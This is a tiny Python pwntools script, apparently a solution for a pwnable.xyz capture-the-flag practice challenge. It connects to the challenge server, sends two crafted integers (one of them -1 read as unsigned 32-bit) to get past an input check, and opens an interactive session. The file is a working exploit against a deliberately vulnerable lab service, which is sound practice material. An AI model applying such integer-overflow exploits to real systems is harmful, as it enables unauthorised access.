#!/usr/bin/python 
from pwn import *

p = remote("svc.pwnable.xyz", 30001)

v4 = 4918
v5 = 4294967295

p.sendlineafter("1337 input: ", str(v4) + " " + str(v5))

p.interactive()
